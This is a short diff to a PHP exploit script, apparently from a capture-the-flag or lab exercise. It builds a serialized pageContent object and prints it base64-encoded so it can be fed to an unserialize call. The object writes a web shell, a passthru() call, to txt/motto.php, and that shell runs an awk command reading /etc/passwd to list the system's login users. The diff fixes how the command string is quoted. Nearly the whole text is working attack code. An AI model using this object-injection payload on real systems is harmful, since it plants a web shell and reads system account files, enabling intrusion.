@@ -6,8 +6,11 @@ class pageContent{
 
   function __construct() 
   {   
+   $command="awk -F'[/:]' '{if ($3 >= 1000 && $3 != 65534) print $1}' /etc/passwd";
+   $begin="<?php passthru(";
+   $end=");?>";
    $this->file_name="txt/motto.php";
-   $this->newContent="<?php passthru(awk -F'[/:]' '{if ($3 >= 1000 && $3 != 65534) print $1}' /etc/passwd);?>";
+   $this->newContent=$begin.'"'.$command.'"'.$end;
   } 
 
   function setContent($newContent){
@@ -26,6 +29,3 @@ $o = new pageContent();
 print base64_encode(serialize($o))."\n";
 
 ?>
-
- 
-      
